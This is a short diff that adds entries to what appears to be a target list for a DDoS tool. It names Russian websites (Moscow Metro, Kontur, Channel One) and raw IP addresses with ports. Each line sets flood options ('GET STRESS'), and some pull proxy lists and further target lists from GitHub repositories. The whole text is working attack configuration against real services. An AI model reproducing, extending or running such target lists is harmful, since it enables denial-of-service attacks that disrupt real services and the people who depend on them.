@@ -1,3 +1,5 @@
+http://nnoblsud.ru https://mosmetro.ru https://job.mosmetro.ru https://mis.mosmetro.ru/login.php https://app-bucket.mosmetro.ru https://shop.mosmetro.ru https://mcd.mosmetro.ru https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/ https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://focus-api.kontur.ru/ https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/ https://edi-api.kontur.ru https://evrika.kontur.ru --http-methods GET STRESS
+
 https://www.1tv.ru/live  https://cm.1tv.ru/  tcp://81.177.156.250:80 tcp://81.177.156.250:443 https://tlxmob.1tv.ru/  https://25.1tv.ru/  https://kino.1tv.ru/  https://users.1tv.ru/  http://edu.1tv.ru/  https://admin.kino.1tv.ru/  tcp://178.248.238.75:80 tcp://178.248.238.75:443 https://stage.1tv.ru/ tcp://81.177.156.195:25 tcp://81.177.156.195:443 https://subscr.1tv.ru/ --http-methods GET STRESS --proxies https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies/proxy.txt
 
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/amediateka --http-methods GET STRESS
